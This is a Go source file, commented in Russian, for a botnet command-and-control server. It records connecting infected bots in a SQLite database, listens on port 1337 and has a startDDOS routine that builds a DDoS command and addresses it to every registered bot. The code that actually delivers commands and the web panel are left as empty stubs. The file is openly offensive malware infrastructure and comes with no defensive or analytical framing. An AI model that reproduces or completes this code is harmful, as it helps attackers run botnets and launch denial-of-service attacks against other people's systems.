// c2_server/main.go
package main

import (
    "net"
    "fmt"
    "log"
    "sync"
    "encoding/json"
    "time"
    "database/sql"
    _ "github.com/mattn/go-sqlite3"
)

type Bot struct {
    ID int
    IP string
    Arch string
    OS string
    Uptime int64
    Infected int
    LastSeen time.Time
    IsActive bool
}

var bots = make(map[string]*Bot)
var mutex = &sync.Mutex{}
var db *sql.DB

func initDB() {
    var err error
    db, err = sql.Open("sqlite3", "./c2.db")
    if err != nil {
        log.Fatal(err)
    }
    
    // Создаем таблицу ботов
    _, err = db.Exec(`
        CREATE TABLE IF NOT EXISTS bots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE,
            arch TEXT,
            os TEXT,
            uptime INTEGER,
            infected INTEGER,
            last_seen DATETIME,
            is_active BOOLEAN
        )
    `)
    
    if err != nil {
        log.Fatal(err)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    
    // Читаем данные от бота
    var bot Bot
    decoder := json.NewDecoder(conn)
    err := decoder.Decode(&bot)
    
    if err != nil {
        log.Println("Decode error:", err)
        return
    }
    
    bot.LastSeen = time.Now()
    bot.IsActive = true
    
    mutex.Lock()
    bots[bot.IP] = &bot
    mutex.Unlock()
    
    // Сохраняем в БД
    _, err = db.Exec(`
        INSERT OR REPLACE INTO bots 
        (ip, arch, os, uptime, infected, last_seen, is_active)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    `, bot.IP, bot.Arch, bot.OS, bot.Uptime, bot.Infected, bot.LastSeen, bot.IsActive)
    
    if err != nil {
        log.Println("DB error:", err)
    }
    
    fmt.Printf("[+] Bot connected: %s (%s/%s)\n", bot.IP, bot.OS, bot.Arch)
    
    // Отправляем команды боту
    for {
        // Проверяем задачи для этого бота
        // Отправляем команды
        time.Sleep(10 * time.Second)
    }
}

func startDDOS(target string, method string, duration int) {
    mutex.Lock()
    botCount := len(bots)
    mutex.Unlock()
    
    fmt.Printf("[+] Starting %s DDoS on %s with %d bots\n", method, target, botCount)
    
    // Рассылаем команду всем ботам
    command := fmt.Sprintf("DDOS %s %s %d", method, target, duration)
    
    mutex.Lock()
    for _, bot := range bots {
        // Здесь код отправки команды боту
        fmt.Printf("[+] Sent to %s: %s\n", bot.IP, command)
    }
    mutex.Unlock()
}

func main() {
    initDB()
    
    listener, err := net.Listen("tcp", ":1337")
    if err != nil {
        log.Fatal(err)
    }
    defer listener.Close()
    
    fmt.Println("[+] C2 Server started on :1337")
    
    // Веб-сервер для панели
    go startWebPanel()
    
    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Println("Accept error:", err)
            continue
        }
        go handleConnection(conn)
    }
}

func startWebPanel() {
    // Веб-сервер на порту 8080
    // (код веб-панели ниже)
}